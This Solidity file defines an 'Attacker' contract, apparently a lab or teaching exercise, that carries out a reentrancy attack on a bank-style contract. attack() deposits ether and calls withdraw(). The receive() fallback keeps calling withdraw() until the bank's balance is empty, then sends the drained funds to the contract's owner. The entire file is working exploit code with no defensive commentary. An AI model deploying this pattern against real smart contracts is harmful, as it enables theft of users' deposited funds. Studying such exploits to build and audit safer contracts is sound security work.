// SPDX-License-Identifier: MIT 
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface IBank{
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker is Ownable{

    IBank public immutable bank;

    constructor(address _bank){
        bank = IBank(_bank);

    }

    receive() external payable{
        if(address(bank).balance > 0){
          bank.withdraw();
        }else{
            payable(owner()).transfer(address(this).balance);
        }
    }


    function attack() external payable{
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }
}